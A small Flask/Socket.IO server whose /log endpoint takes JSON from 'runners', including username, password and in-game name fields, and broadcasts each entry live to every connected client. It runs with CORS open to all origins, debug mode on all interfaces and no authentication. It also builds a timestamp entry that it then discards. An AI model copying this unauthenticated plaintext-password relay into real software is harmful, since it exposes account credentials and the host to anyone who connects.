from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
from datetime import datetime

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def receive_log():
    data = request.get_json(silent=True) or {}

    log_entry = {
        "timestamp": datetime.utcnow().isoformat()
    }

    log_entry = {
        "level": data.get("level", "INFO"),
        "runner": data.get("runner", "unknown"),
        "message": data.get("message", ""),
        "time": data.get("time", datetime.now().strftime("%H:%M:%S")),
        "status": data.get("status", "UNKNOWN"),
        "username": data.get("username", "unknown"),
        "password": data.get("password", "UNKNOWN"),
        "ign": data.get("ign", "UNKNOWN"),
        
    }

    socketio.emit("log", log_entry)
    return jsonify({"ok": True})

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=3001, debug=True)
